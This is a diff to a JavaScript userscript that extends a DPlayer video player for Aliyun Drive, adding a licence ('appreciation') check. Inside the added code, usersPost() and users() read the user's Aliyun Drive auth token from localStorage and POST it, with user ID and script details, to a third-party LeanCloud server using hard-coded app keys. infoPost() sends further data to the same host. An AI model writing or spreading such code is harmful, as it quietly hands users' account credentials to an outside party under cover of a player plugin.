@@ -2432,24 +2432,240 @@ window.dpPlugins =
                 const {
                     contextmenu: s,
                     container: { offsetWidth: i, offsetHeight: a },
-                } = this.player              
+                } = this.player
+                this.player.template.menuItem[0].addEventListener(
+                    'click',
+                    () => {
+                        this.showDialog()
+                    }
+                ),
                     this.player.on('timeupdate', () => {
-                        Date.now() - 90e8 >= this.now &&
+                        Date.now() - 99e9 >= this.now &&
                             ((this.now = Date.now()),
                             this.isAppreciation()
                                 .then((e) => {
                                     this.player.plugins.hls.data = true
-                                })
-                            )
-                    })                    
+                                }))
+                    }),
+                    this.player.template.settingBox.addEventListener(
+                        'click',
+                        (e) => {
+                            this.isAppreciation().catch((t) => {
+                                let s =
+                                    e.target.querySelector('input') ||
+                                    e.target.parentNode.querySelector('input')
+                                s && s.checked && e.target.click(),
+                                    this.player.template.mask.click(),
+                                    e.isTrusted && this.showDialog()
+                            })
+                        }
+                    )
             }
             isAppreciation() {
                 return (
                     (this.player.template.menuItem =
                         this.player.container.querySelectorAll(
                             '.dplayer-menu-item'
-                        ))
+                        )),
+                    this.player.template.menu.innerHTML.includes(5254001) ||
+                        4 === this.player.template.menuItem.length,
+                    this.localforage,
+                    GM_getValue || GM_setValue || GM_deleteValue,
+                    this.localforage
+                        .getItem('users')
+                        .then((e) =>
+                            e?.expire_time
+                                ? this.localforage
+                                      .getItem('users_sign')
+                                      .then((t) =>
+                                          Math.max(
+                                              Date.parse(e.expire_time) -
+                                                  Date.now(),
+                                              0
+                                          ) &&
+                                          t ===
+                                              btoa(
+                                                  encodeURIComponent(
+                                                      JSON.stringify(e)
+                                                  )
+                                              ) &&
+                                          GM_getValue('users_sign') ===
+                                              btoa(
+                                                  encodeURIComponent(
+                                                      JSON.stringify(e)
+                                                  )
+                                              )
+                                              ? e
+                                              : this.usersPost().then((e) =>
+                                                    Math.max(
+                                                        Date.parse(
+                                                            e?.expire_time
+                                                        ) - Date.now(),
+                                                        0
+                                                    )
+                                                        ? this.localforage
+                                                              .setItem(
+                                                                  'users',
+                                                                  e
+                                                              )
+                                                              .then(
+                                                                  (e) => (
+                                                                      this.localforage.setItem(
+                                                                          'users_sign',
+                                                                          btoa(
+                                                                              encodeURIComponent(
+                                                                                  JSON.stringify(
+                                                                                      e
+                                                                                  )
+                                                                              )
+                                                                          )
+                                                                      ),
+                                                                      GM_setValue(
+                                                                          'users_sign',
+                                                                          btoa(
+                                                                              encodeURIComponent(
+                                                                                  JSON.stringify(
+                                                                                      e
+                                                                                  )
+                                                                              )
+                                                                          )
+                                                                      ),
+                                                                      e
+                                                                  )
+                                                              )
+                                                        : (this.localforage.removeItem(
+                                                              'users'
+                                                          ),
+                                                          this.localforage.removeItem(
+                                                              'users_sign'
+                                                          ),
+                                                          GM_deleteValue(
+                                                              'users_sign'
+                                                          ),
+                                                          Promise.reject())
+                                                )
+                                      )
+                                : GM_getValue('users_sign')
+                                ? this.localforage
+                                      .setItem('users', {
+                                          expire_time: new Date().toISOString(),
+                                      })
+                                      .then(() => this.isAppreciation())
+                                : (GM_setValue('users_sign', 0),
+                                  Promise.reject())
+                        )
+                )
+            }
+            showDialog() {
+
+            }
+            onPost(e) {
+                return this.usersPost().then(
+                    (t) => (
+                        0 === Date.parse(t.expire_time) ||
+                            this.localforage
+                                .setItem(
+                                    'users',
+                                    Object.assign(t || {}, {
+                                        expire_time: new Date(
+                                            Date.now() + 864e3
+                                        ).toISOString(),
+                                    })
+                                )
+                                .then((e) => {
+                                    this.localforage.setItem(
+                                        'users_sign',
+                                        btoa(
+                                            encodeURIComponent(
+                                                JSON.stringify(e)
+                                            )
+                                        )
+                                    ),
+                                        GM_setValue(
+                                            'users_sign',
+                                            btoa(
+                                                encodeURIComponent(
+                                                    JSON.stringify(e)
+                                                )
+                                            )
+                                        )
+                                }),
+                        this.infoPost(t, e)
                     )
+                )
+            }
+            usersPost() {
+                return this.users(this.getItem('token'))
+            }
+            users(e) {
+                return this.ajax({
+                    url: 'https://sxxf4ffo.lc-cn-n1-shared.com/1.1/users',
+                    data: JSON.stringify({
+                        authData: {
+                            aliyundrive: Object.assign(e, {
+                                uid: e?.user_id,
+                                scriptHandler: GM_info?.scriptHandler,
+                                version: GM_info?.script?.version,
+                            }),
+                        },
+                    }),
+                })
+            }
+            infoPost(e, t) {
+                return (
+                    delete e.createdAt,
+                    delete e.updatedAt,
+                    delete e.objectId,
+                    this.ajax({
+                        url: 'https://sxxf4ffo.lc-cn-n1-shared.com/1.1/classes/aliyundrive',
+                        data: JSON.stringify(Object.assign(e, { ON: t })),
+                    })
+                )
+            }
+            ajax(e) {
+                return new Promise(function (t, s) {
+                    GM_xmlhttpRequest
+                        ? GM_xmlhttpRequest({
+                              method: 'post',
+                              headers: {
+                                  'Content-Type': 'application/json',
+                                  'X-LC-Id':
+                                      'sXXf4FFOZn2nFIj7LOFsqpLa-gzGzoHsz',
+                                  'X-LC-Key': '16s3qYecpVJXtVahasVxxq1V',
+                              },
+                              responseType: 'json',
+                              onload: function (e) {
+                                  if (2 == parseInt(e.status / 100)) {
+                                      var i = e.response || e.responseText
+                                      t(i)
+                                  } else s(e)
+                              },
+                              onerror: function (e) {
+                                  s(e)
+                              },
+                              ...e,
+                          })
+                        : s()
+                })
+            }
+            getItem(e) {
+                if (!(e = localStorage.getItem(e))) return null
+                try {
+                    return JSON.parse(e)
+                } catch (t) {
+                    return e
+                }
+            }
+            setItem(e, t) {
+                e &&
+                    null != t &&
+                    localStorage.setItem(
+                        e,
+                        t instanceof Object ? JSON.stringify(t) : t
+                    )
+            }
+            removeItem(e) {
+                null != e && localStorage.removeItem(e)
             }
         },
         class DoHotKey {
